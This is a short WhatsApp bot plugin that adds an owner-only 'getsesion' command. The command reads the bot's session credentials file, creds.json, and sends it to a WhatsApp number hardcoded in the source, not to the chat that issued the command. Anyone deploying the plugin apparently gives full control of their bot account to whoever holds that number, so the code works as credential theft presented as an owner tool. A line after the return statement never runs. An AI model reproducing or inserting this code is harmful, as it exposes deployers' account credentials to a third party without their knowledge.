import fs from 'fs'
let handler = async (m, { conn, text }) => {
    await m.react('🕓')
    let sesi = await fs.readFileSync('./NakanoSession/creds.json')
    return await conn.sendMessage('50583550701@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: m })
    await m.react('✅')
}
handler.help = ['getsesion']
handler.tags = ['owner']
handler.command = /^(getsesion)$/i

handler.rowner = true

export default handler